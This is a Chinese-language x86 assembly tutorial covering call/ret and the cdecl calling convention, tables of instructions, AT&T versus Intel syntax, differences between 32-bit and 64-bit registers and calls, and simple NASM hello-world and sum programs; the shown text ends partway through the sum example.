<p>call, ret— Subroutine call and return<br>这两条指令实现子程序（过程、函数等意思）的调用及返回。call指令首先将当前执行指令地址入栈，然后无条件转移到由标签指示的指令。与其它简单的跳转指令不同，call指令保存调用之前的地址信息（当call指令结束后，返回到调用之前的地址）。<br>ret指令实现子程序的返回机制，ret指令弹出栈中保存的指令地址，然后无条件转移到保存的指令地址执行。call，ret是函数调用中最关键的两条指令。<br>调用规则<br>为了加强程序员之间的协作及简化程序开发进程，设定一个函数调用规则非常必要，函数调用规则规定函数调用及返回的规则，只要遵照这种规则写的程序均可以正确执行，从而程序员不必关心诸如参数如何传递等问题；另一方面，在汇编语言中可以调用符合这种规则的高级语言所写的函数，从而将汇编语言程序与高级语言程序有机结合在一起。<br>调用规则分为两个方面，及调用者规则和被调用者规则，如一个函数A调用一个函数B，则A被称为调用者(Caller)，B被称为被调用者(Callee)。<br>下图显示一个调用过程中的内存中的栈布局：</p>
<p><img src="/images/stack-convention.png" alt=""></p>
<p>在X86中，栈增长方向与内存编号增长方向相反。<br>Caller Rules</p>
<p>调用者规则包括一系列操作，描述如下：<br>1.在调用子程序之前，调用者应该保存一系列被设计为调用者保存的寄存器的值。调用者保存寄存器有eax，ecx，edx。由于被调用的子程序会修改这些寄存器，所以为了在调用子程序完成之后能正确执行，调用者必须在调用子程序之前将这些寄存器的值入栈。<br>2.在调用子程序之前，将参数入栈。参数入栈的顺序应该是从最后一个参数开始，如上图中parameter3先入栈。<br>3.利用call指令调用子程序。这条指令将返回地址放置在参数的上面，并进入子程序的指令执行。（子程序的执行将按照被调用者的规则执行）</p>
<p>当子程序返回时，调用者期望找到子程序保存在eax中的返回地址。为了恢复调用子程序执行之前的状态，调用者应该执行以下操作：<br>1.清除栈中的参数；<br>2.将栈中保存的eax值、ecx值以及edx值出栈，恢复eax、ecx、edx的值（当然，如果其它寄存器在调用之前需要保存，也需要完成类似入栈和出栈操作）</p>
<p>Example </p>
<p>如下代码展示了一个调用子程序的调用者应该执行的操作。此汇编程序调用一个具有三个参数的函数_myFunc，其中第一个参数为eax，第二个参数为常数216，第三个参数为var指示的内存中的值。</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">push [var]   ; Push <span class="keyword">last</span> parameter <span class="keyword">first</span></div><div class="line">push <span class="number">216</span>     ; Push <span class="keyword">the</span> <span class="keyword">second</span> parameter</div><div class="line">push eax     ; Push <span class="keyword">first</span> parameter <span class="keyword">last</span></div><div class="line">call <span class="title">_my</span>Func ; Call <span class="keyword">the</span> <span class="function"><span class="keyword">function</span> (<span class="title">assume</span> <span class="title">C</span> <span class="title">naming</span>)</span></div><div class="line"><span class="built_in">add</span> esp, <span class="number">12</span></div></pre></td></tr></table></figure>
<p>在调用返回时，调用者必须清除栈中的相应内容，在上例中，参数占有12个字节，为了消除这些参数，只需将ESP加12即可。</p>
<p> _myFunc的值保存在eax中，ecx和edx中的值也许已经被改变，调用者还必须在调用之前保存在栈中，并在调用结束之后，出栈恢复ecx和edx的值。</p>
<p>被调用者应该遵循如下规则：<br>1.将ebp入栈，并将esp中的值拷贝到ebp中，其汇编代码如下：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">push</span> <span class="built_in">ebp</span></div><div class="line"><span class="keyword">mov</span>  <span class="built_in">ebp</span>, <span class="built_in">esp</span></div></pre></td></tr></table></figure>
<p>上述代码的目的是保存调用子程序之前的基址指针，基址指针用于寻找栈上的参数和局部变量。当一个子程序开始执行时，基址指针保存栈指针指示子程序的执行。为了在子程序完成之后调用者能正确定位调用者的参数和局部变量，ebp的值需要返回。<br>2.在栈上为局部变量分配空间。<br>3.保存callee-saved寄存器的值，callee-saved寄存器包括ebx,edi和esi，将ebx,edi和esi压栈。<br>4.在上述三个步骤完成之后，子程序开始执行，当子程序返回时，必须完成如下工作：<br>(1)将返回的执行结果保存在eax中<br>(2)弹出栈中保存的callee-saved寄存器值，恢复callee-saved寄存器的值（ESI和EDI）<br>(3)收回局部变量的内存空间。实际处理时，通过改变EBP的值即可：mov esp, ebp。<br>(4)通过弹出栈中保存的ebp值恢复调用者的基址寄存器值。<br>(5)执行ret指令返回到调用者程序。</p>
<p>Example</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="meta">.486</span></div><div class="line"><span class="meta">.MODEL</span> FLAT</div><div class="line"><span class="meta">.CODE</span></div><div class="line"><span class="meta">PUBLIC</span> _myFunc</div><div class="line">_myFunc PROC</div><div class="line">  <span class="comment">; Subroutine Prologue</span></div><div class="line">  <span class="keyword">push</span> <span class="built_in">ebp</span>     <span class="comment">; Save the old base pointer value.</span></div><div class="line">  <span class="keyword">mov</span> <span class="built_in">ebp</span>, <span class="built_in">esp</span> <span class="comment">; Set the new base pointer value.</span></div><div class="line">  <span class="keyword">sub</span> <span class="built_in">esp</span>, <span class="number">4</span>   <span class="comment">; Make room for one 4-byte local variable.</span></div><div class="line">  <span class="keyword">push</span> <span class="built_in">edi</span>     <span class="comment">; Save the values of registers that the function</span></div><div class="line">  <span class="keyword">push</span> <span class="built_in">esi</span>     <span class="comment">; will modify. This function uses EDI and ESI.</span></div><div class="line">  <span class="comment">; (no need to save EBX, EBP, or ESP)</span></div><div class="line"></div><div class="line">  <span class="comment">; Subroutine Body</span></div><div class="line">  <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">8</span>]   <span class="comment">; Move value of parameter 1 into EAX</span></div><div class="line">  <span class="keyword">mov</span> <span class="built_in">esi</span>, [<span class="built_in">ebp</span>+<span class="number">12</span>]  <span class="comment">; Move value of parameter 2 into ESI</span></div><div class="line">  <span class="keyword">mov</span> <span class="built_in">edi</span>, [<span class="built_in">ebp</span>+<span class="number">16</span>]  <span class="comment">; Move value of parameter 3 into EDI</span></div><div class="line"></div><div class="line">  <span class="keyword">mov</span> [<span class="built_in">ebp</span>-<span class="number">4</span>], <span class="built_in">edi</span>   <span class="comment">; Move EDI into the local variable</span></div><div class="line">  <span class="keyword">add</span> [<span class="built_in">ebp</span>-<span class="number">4</span>], <span class="built_in">esi</span>   <span class="comment">; Add ESI into the local variable</span></div><div class="line">  <span class="keyword">add</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">4</span>]   <span class="comment">; Add the contents of the local variable</span></div><div class="line">                     <span class="comment">; into EAX (final result)</span></div><div class="line"></div><div class="line">  <span class="comment">; Subroutine Epilogue </span></div><div class="line">  <span class="keyword">pop</span> <span class="built_in">esi</span>      <span class="comment">; Recover register values</span></div><div class="line">  <span class="keyword">pop</span>  <span class="built_in">edi</span></div><div class="line">  <span class="keyword">mov</span> <span class="built_in">esp</span>, <span class="built_in">ebp</span> <span class="comment">; Deallocate local variables</span></div><div class="line">  <span class="keyword">pop</span> <span class="built_in">ebp</span> <span class="comment">; Restore the caller's base pointer value</span></div><div class="line">  <span class="keyword">ret</span></div><div class="line">_myFunc ENDP</div><div class="line">END</div></pre></td></tr></table></figure>
<p>子程序首先通过入栈的手段保存ebp，分配局部变量，保存寄存器的值。</p>
<p>在子程序体中，参数和局部变量均是通过ebp进行计算。由于参数传递在子程序被调用之前，所以参数总是在ebp指示的地址的下方（在栈中），因此，上例中的第一个参数的地址是ebp+8，第二个参数的地址是ebp+12，第三个参数的地址是ebp+16；而局部变量在ebp指示的地址的上方，所有第一个局部变量的地址是ebp-4，而第二个这是ebp-8.</p>
<h3 id="条件转移指令"><a href="#条件转移指令" class="headerlink" title="条件转移指令"></a>条件转移指令</h3><p>(短转移,-128到+127的距离内)  ( 当且仅当(SF XOR OF)=1时,OP1&lt;OP2 )</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">JA</span>/<span class="keyword">JNBE</span>  不小于或不等于时转移        </div><div class="line"><span class="keyword">JAE</span>/<span class="keyword">JNB</span>  大于或等于转移</div><div class="line"><span class="keyword">JB</span>/<span class="keyword">JNAE</span>  小于转移                             </div><div class="line"><span class="keyword">JBE</span>/<span class="keyword">JNA</span>  小于或等于转移 </div><div class="line">以上四条,测试无符号整数运算的结果(标志C和Z)  </div><div class="line"><span class="keyword">JG</span>/<span class="keyword">JNLE</span>  大于转移                              </div><div class="line"><span class="keyword">JGE</span>/<span class="keyword">JNL</span>  大于或等于转移  </div><div class="line"><span class="keyword">JL</span>/<span class="keyword">JNGE</span>  小于转移                              </div><div class="line"><span class="keyword">JLE</span>/<span class="keyword">JNG</span>  小于或等于转移  </div><div class="line">以上四条,测试带符号整数运算的结果(标志S,O和Z)  </div><div class="line"><span class="keyword">JE</span>/<span class="keyword">JZ</span>    等于转移                                  </div><div class="line"><span class="keyword">JNE</span>/<span class="keyword">JNZ</span>  不等于时转移  </div><div class="line"><span class="keyword">JC</span>       有进位时转移                               </div><div class="line"><span class="keyword">JNC</span>      无进位时转移  </div><div class="line"><span class="keyword">JNO</span>      不溢出时转移                             </div><div class="line"><span class="keyword">JO</span>       溢出转移  </div><div class="line"><span class="keyword">JNP</span>/<span class="keyword">JPO</span>  奇偶性为奇数时转移           </div><div class="line"><span class="keyword">JP</span>/<span class="keyword">JPE</span>   奇偶性为偶数时转移  </div><div class="line"><span class="keyword">JNS</span>      符号位为 “<span class="number">0</span>” 时转移                  </div><div class="line"><span class="keyword">JS</span>       符号位为 <span class="string">"1"</span> 时转移</div></pre></td></tr></table></figure>
<h3 id="循环控制指令-短转移"><a href="#循环控制指令-短转移" class="headerlink" title="循环控制指令(短转移)"></a>循环控制指令(短转移)</h3><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">LOOP</span>           <span class="built_in">CX</span>不为零时循环              </div><div class="line"><span class="keyword">LOOPE</span>/<span class="keyword">LOOPZ</span>    <span class="built_in">CX</span>不为零且标志Z=<span class="number">1</span>时循环</div><div class="line"><span class="keyword">LOOPNE</span>/<span class="keyword">LOOPNZ</span>  <span class="built_in">CX</span>不为零且标志Z=<span class="number">0</span>时循环 </div><div class="line"><span class="keyword">JCXZ</span>           <span class="built_in">CX</span>为零时转移                </div><div class="line"><span class="keyword">JECXZ</span>          <span class="built_in">ECX</span>为零时转移</div></pre></td></tr></table></figure>
<h3 id="中断指令"><a href="#中断指令" class="headerlink" title="中断指令"></a>中断指令</h3><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">INT</span> 	中断指令                </div><div class="line">NTO 	溢出中断             </div><div class="line"><span class="keyword">IRET</span> 	中断返回</div></pre></td></tr></table></figure>
<h3 id="处理器控制指令"><a href="#处理器控制指令" class="headerlink" title="处理器控制指令"></a>处理器控制指令</h3><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">HLT</span>   处理器暂停, 直到出现中断或复位信号才继续</div><div class="line">WAIT  当芯片引线<span class="keyword">TEST</span>为高电平时使<span class="meta">CPU</span>进入等待状态  </div><div class="line">ESC   转换到外处理器     </div><div class="line"><span class="keyword">LOCK</span>  封锁总线            </div><div class="line"><span class="keyword">NOP</span>   空操作  </div><div class="line"><span class="keyword">STC</span>   置进位标志位      </div><div class="line"><span class="keyword">STD</span>   置方向标志位        </div><div class="line"><span class="keyword">STI</span>   置中断允许位</div><div class="line"><span class="keyword">CMC</span>   进位标志取反</div><div class="line"><span class="keyword">CLC</span>   清进位标志位       </div><div class="line"><span class="keyword">CLD</span>   清方向标志位        </div><div class="line"><span class="keyword">CLI</span>   清中断允许位</div></pre></td></tr></table></figure>
<h2 id="伪指令"><a href="#伪指令" class="headerlink" title="伪指令"></a>伪指令</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">DB</span>            定义字节  </div><div class="line"><span class="built_in">DW</span>            定义字(<span class="number">2</span>字节)  </div><div class="line">PROC          定义过程  </div><div class="line">ENDP          过程结束  </div><div class="line"><span class="meta">SEGMENT</span>       定义段  </div><div class="line"><span class="meta">ASSUME</span>        建立段寄存器寻址 </div><div class="line">ENDS          段结束  </div><div class="line">END           程序结束</div></pre></td></tr></table></figure>
<h1 id="汇编语法格式"><a href="#汇编语法格式" class="headerlink" title="汇编语法格式"></a>汇编语法格式</h1><p>1.在 AT&amp;T 汇编格式中，寄存器名要加上 ‘%’ 作为前缀；而在 Intel 汇编格式中，寄存器名不需要加前缀。例如：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">AT</span>&amp;T 格式	        Intel 格式</div><div class="line">pushl %eax	        <span class="keyword">push</span> <span class="built_in">eax</span></div></pre></td></tr></table></figure>
<p>2.在 AT&amp;T 汇编格式中，用 ‘$’ 前缀表示一个立即操作数；而在 Intel 汇编格式中，立即数的表示不用带任何前缀。例如：</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">AT</span>&amp;T 格式	        Intel 格式</div><div class="line"><span class="keyword">pushl </span><span class="number">$1</span>	        <span class="keyword">push </span><span class="number">1</span></div></pre></td></tr></table></figure>
<p>3.AT&amp;T 和 Intel 格式中的源操作数和目标操作数的位置正好相反。在 Intel 汇编格式中，目标操作数在源操作数的左边；而在 AT&amp;T 汇编格式中，目标操作数在源操作数的右边。例如：</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">AT</span>&amp;T 格式	        Intel 格式</div><div class="line"><span class="keyword">addl </span>$<span class="number">1</span>, %eax	        <span class="keyword">add </span>eax, <span class="number">1</span></div></pre></td></tr></table></figure>
<p>4.在 AT&amp;T 汇编格式中，操作数的字长由操作符的最后一个字母决定，后缀’b’、’w’、’l’分别表示操作数为字节（byte，8 比特）、字（word，16 比特）和长字（long，32比特）；而在 Intel 汇编格式中，操作数的字长是用 “byte ptr” 和 “word ptr” 等前缀来表示的。例如：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">AT</span>&amp;T 格式	        Intel 格式</div><div class="line">movb val, %al	        <span class="keyword">mov</span> <span class="built_in">al</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> val</div></pre></td></tr></table></figure>
<p>5.在 AT&amp;T 汇编格式中，绝对转移和调用指令（jump/call）的操作数前要加上’*’作为前缀，而在 Intel 格式中则不需要。</p>
<p>6.远程转移指令和远程子调用指令的操作码，在 AT&amp;T 汇编格式中为 “ljump” 和 “lcall”，而在 Intel 汇编格式中则为 “jmp far” 和 “call far”，即：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">AT</span>&amp;T 格式	                      Intel 格式</div><div class="line">ljump $<span class="meta">section</span>, $offset	              <span class="keyword">jmp</span> <span class="built_in">far</span> <span class="meta">section</span>:offset</div><div class="line">lcall $<span class="meta">section</span>, $offset	              <span class="keyword">call</span> <span class="built_in">far</span> <span class="meta">section</span>:offset</div></pre></td></tr></table></figure>
<p>与之相应的远程返回指令则为：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">AT</span>&amp;T 格式	                      Intel 格式</div><div class="line">lret $stack_adjust	              <span class="keyword">ret</span> <span class="built_in">far</span> stack_adjust</div></pre></td></tr></table></figure>
<p>7.在 AT&amp;T 汇编格式中，内存操作数的寻址方式是</p>
<figure class="highlight excel"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">secti<span class="symbol">on:di</span>sp(<span class="built_in">base</span>, <span class="built_in">index</span>, scale)</div></pre></td></tr></table></figure>
<p>而在 Intel 汇编格式中，内存操作数的寻址方式为：</p>
<figure class="highlight excel"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">secti<span class="symbol">on:</span>[<span class="built_in">base</span> + <span class="built_in">index</span>*scale + disp]</div></pre></td></tr></table></figure>
<p>由于 Linux 工作在保护模式下，用的是 32 位线性地址，所以在计算地址时不用考虑段基址和偏移量，而是采用如下的地址计算方法：</p>
<figure class="highlight excel"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">disp + <span class="built_in">base</span> + <span class="built_in">index</span> * scale</div></pre></td></tr></table></figure>
<p>下面是一些内存操作数的例子：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">AT</span>&amp;T 格式	                        Intel 格式</div><div class="line">movl -<span class="number">4</span>(%ebp), %eax     	    <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span> - <span class="number">4</span>]</div><div class="line">movl array(, %eax, <span class="number">4</span>), %eax	    <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">eax</span>*<span class="number">4</span> + array]</div><div class="line">movw array(%ebx, %eax, <span class="number">4</span>), %cx	    <span class="keyword">mov</span> <span class="built_in">cx</span>, [<span class="built_in">ebx</span> + <span class="number">4</span>*<span class="built_in">eax</span> + array]</div><div class="line">movb <span class="number">$4</span>, %fs:(%eax)         	    <span class="keyword">mov</span> <span class="built_in">fs</span>:<span class="built_in">eax</span>, <span class="number">4</span></div></pre></td></tr></table></figure>
<h1 id="64位和32位的寄存器和汇编的比较"><a href="#64位和32位的寄存器和汇编的比较" class="headerlink" title="64位和32位的寄存器和汇编的比较"></a>64位和32位的寄存器和汇编的比较</h1><p><img src="/images/14955328458588.jpg" alt=""></p>
<p>X64多了8个通用寄存器：R8、R9、R10、R11、R12、R13、R14、R15，当然，它们都是64位的。另外还增加了8个128位XMM寄存器，不过通常用不着。<br>    X32中原有的寄存器在X64中均为扩展为64位，且名称的第一个字母从E改为R。不过我们还是可以在64位程序中调用32位的寄存器，如RAX（64位）、EAX（低32）、AX（低16位）、AL（低8位）、AH（8到15位），相应的有R8、R8D、R8W和R8B。不过不要在程序中使用如AH之类的寄存器，因为在AMD的CPU上这种用法会与某些指令产生冲突</p>
<h2 id="64位寄存器分配的不同"><a href="#64位寄存器分配的不同" class="headerlink" title="64位寄存器分配的不同:"></a>64位寄存器分配的不同:</h2><p><img src="/images/14955328749738.jpg" alt=""></p>
<p>64位有16个寄存器，32位只有8个。但是32位前8个都有不同的命名，分别是e <em> ，而64位前8个使用了r代替e，也就是r </em>。e开头的寄存器命名依然可以直接运用于相应寄存器的低32位。而剩下的寄存器名则是从r8 - r15，其低位分别用d，w,b指定长度。<br>32位使用栈帧来作为传递的参数的保存位置，而64位使用寄存器，分别用rdi,rsi,rdx,rcx,r8,r9作为第1-6个参数。rax作为返回值<br>64位没有栈帧的指针，32位用ebp作为栈帧指针，64位取消了这个设定，rbp作为通用寄存器使用<br>64位支持一些形式的以PC相关的寻址，而32位只有在jmp的时候才会用到这种寻址方式。</p>
<p><img src="/images/20160428235309742.png" alt=""></p>
<p>mov指令和push pop扩展了movq系列的mov和pushq以及popq用来操作quad word。<br>注：movabsq不是32位的扩展，是纯新增的指令。用来将一个64位的字面值直接存到一个64位寄存器中。因为movq只能将32位的值存入，所以新增了这样一条指令。</p>
<p><img src="/images/14955327305103.jpg" alt=""></p>
<h2 id="过程（函数）调用的不同"><a href="#过程（函数）调用的不同" class="headerlink" title="过程（函数）调用的不同"></a>过程（函数）调用的不同</h2><p>参数通过寄存器传递（见前文）<br>callq 在栈里存放一个8位的返回地址<br>许多函数不再有栈帧，只有无法将所有本地变量放在寄存器里的才会在栈上分配空间。<br>函数可以获取到栈至多128字节的空间。这样函数就可以在不更改栈指针的情况下在栈上存储信息（也就是说，可以提前用rsp以下的128字节空间，这段空间被称为red zone，在x86-64里，时刻可用）<br>不再有栈帧指针。现在栈的位置和栈指针相关。大多数函数在调用的一开始就分配全部所需栈空间，之后保持栈指针不改变。<br>一些寄存器被设计成为被调用者-存储的寄存器。这些必须在需要改变他们值的时候存储他们并且之后恢复他们。</p>
<h2 id="参数传递的不同"><a href="#参数传递的不同" class="headerlink" title="参数传递的不同"></a>参数传递的不同</h2><p>6个寄存器用来传递参数<br>剩下的寄存器按照之前的方式传递（不过是与rsp相关了，ebp不再作为栈帧指针，并且从rsp开始第7个参数，rsp+8开始第8个，以此类推）<br>调用时，rsp向下移动8位（存入返回地址），寄存器参数无影响，第7个及之后的参数现在则是从rsp+8开始第7个，rsp+16开始第8个，以此类推</p>
<h2 id="栈帧的不同"><a href="#栈帧的不同" class="headerlink" title="栈帧的不同"></a>栈帧的不同</h2><p>很多情况下不再需要栈帧，比如在没有调用别的函数，且寄存器足以存储参数，那么就只需要存储返回地址即可。 需要栈帧的情况：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">本地变量太多，寄存器不够</div><div class="line">一些本地变量是数组或结构体</div><div class="line">函数使用了取地址操作符来计算一个本地变量的地址</div><div class="line">函数必须用栈传送一些参数给另外一个函数</div><div class="line">函数需要保存一些由被调用者存储的寄存器的状态（以便于恢复）</div></pre></td></tr></table></figure>
<p>但是现在的栈帧经常是固定大小的，在函数调用的最开始就被设定，在整个调用期间，栈顶指针保持不变，这样就可以通过对其再加上偏移量来对相应的值进行操作，于是EBP就不再需要作为栈帧指针了。</p>
<p>虽然很多时候我们认为没有“栈帧”，但是每次函数调用都一定有一个返回地址被压栈，我们可以也认为这一个地址就是一个“栈帧”，因为它也保存了调用者的状态。</p>
<h1 id="基本汇编程序"><a href="#基本汇编程序" class="headerlink" title="基本汇编程序"></a>基本汇编程序</h1><p>1.Hello, world!</p>
<p>32位</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">section</span> .data            </div><div class="line">        msg <span class="built_in">db</span> <span class="string">"Hello, world!"</span>, <span class="number">0xA</span>    </div><div class="line">        len <span class="built_in">equ</span> $ - msg                 </div><div class="line"><span class="meta">section</span> .text            </div><div class="line"><span class="meta">global</span> main           </div><div class="line"><span class="symbol">main:</span>                  </div><div class="line">        <span class="keyword">mov</span> <span class="built_in">edx</span>, len     </div><div class="line">        <span class="keyword">mov</span> <span class="built_in">ecx</span>, msg    </div><div class="line">        <span class="keyword">mov</span> <span class="built_in">ebx</span>, <span class="number">1</span>       </div><div class="line">        <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">4</span>        </div><div class="line">        <span class="keyword">int</span> <span class="number">0x80</span>        </div><div class="line">                         </div><div class="line">        <span class="keyword">mov</span> <span class="built_in">ebx</span>, <span class="number">0</span>       </div><div class="line">        <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">1</span>       </div><div class="line">        <span class="keyword">int</span> <span class="number">0x80</span></div></pre></td></tr></table></figure>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">righteous<span class="variable">@ubuntu</span><span class="symbol">:~/Desktop/asm</span><span class="variable">$ </span>nasm -f elf32 hello.asm</div><div class="line">righteous<span class="variable">@ubuntu</span><span class="symbol">:~/Desktop/asm</span><span class="variable">$ </span>gcc -m32 -o hello hello.o</div><div class="line">righteous<span class="variable">@ubuntu</span><span class="symbol">:~/Desktop/asm</span><span class="variable">$ </span>./hello</div><div class="line">Hello, world!</div></pre></td></tr></table></figure>
<p>64位</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">extern</span>	printf		</div><div class="line"></div><div class="line"><span class="meta">section</span> .data		</div><div class="line"><span class="symbol">	msg:</span>	<span class="built_in">db</span> <span class="string">"Hello world"</span>, <span class="number">0</span>	</div><div class="line"><span class="symbol">	fmt:</span>    <span class="built_in">db</span> <span class="string">"%s"</span>, <span class="number">10</span>, <span class="number">0</span>        </div><div class="line"></div><div class="line"><span class="meta">section</span> .text       </div><div class="line"></div><div class="line"><span class="meta">global</span>  main	</div><div class="line"><span class="symbol">main:</span>				</div><div class="line">        <span class="keyword">push</span>    <span class="built_in">rbp</span>		</div><div class="line">	</div><div class="line">	<span class="keyword">mov</span>	<span class="built_in">rdi</span>,fmt</div><div class="line">	<span class="keyword">mov</span>	<span class="built_in">rsi</span>,msg</div><div class="line">	<span class="keyword">mov</span>	<span class="built_in">rax</span>,<span class="number">0</span>		</div><div class="line">        <span class="keyword">call</span>    printf		</div><div class="line"></div><div class="line">	<span class="keyword">pop</span>	<span class="built_in">rbp</span>		</div><div class="line"></div><div class="line">	<span class="keyword">mov</span>	<span class="built_in">rax</span>,<span class="number">0</span>		</div><div class="line">	<span class="keyword">ret</span></div></pre></td></tr></table></figure>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">righteous<span class="variable">@ubuntu</span><span class="symbol">:~/Desktop/asm</span><span class="variable">$ </span>nasm -f elf64 hello_x64.asm </div><div class="line">righteous<span class="variable">@ubuntu</span><span class="symbol">:~/Desktop/asm</span><span class="variable">$ </span>gcc -m64 -o hello_x64 hello_x64.o</div><div class="line">righteous<span class="variable">@ubuntu</span><span class="symbol">:~/Desktop/asm</span><span class="variable">$ </span>./hello_x64 </div><div class="line">Hello world</div></pre></td></tr></table></figure>
<p>2.求和</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="meta">extern</span>	printf</div><div class="line">      </div><div class="line"><span class="meta">section</span> .data		</div><div class="line"><span class="symbol">	a:</span>  <span class="built_in">dd</span>  <span class="number">5</span></div><div class="line"><span class="symbol">        b:</span>  <span class="built_in">dd</span>  <span class="number">7</span></div><div class="line"><span class="symbol">fmt:</span>    <span class="built_in">db</span> <span class="string">"sum:c=a+b=%d"</span>, <span class="number">10</span>, <span class="number">0</span> </div><div class="line"></div><div class="line"><span class="meta">section</span> .bss</div><div class="line"><span class="symbol">        c:</span>  <span class="built_in">resd</span> <span class="number">1</span>  </div><div class="line"></div><div class="line"><span class="meta">section</span> .text                  </div><div class="line"></div><div class="line"><span class="meta">global</span>  main		</div><div class="line"><span class="symbol">main:</span>				</div><div class="line">        <span class="keyword">push</span>    <span class="built_in">ebp</span>		</div><div class="line">        <span class="keyword">mov</span>     <span class="built_in">ebp</span>,<span class="built_in">esp</span></div><div class="line"></div><div class="line">	<span class="keyword">mov</span>	<span class="built_in">eax</span>, [a]	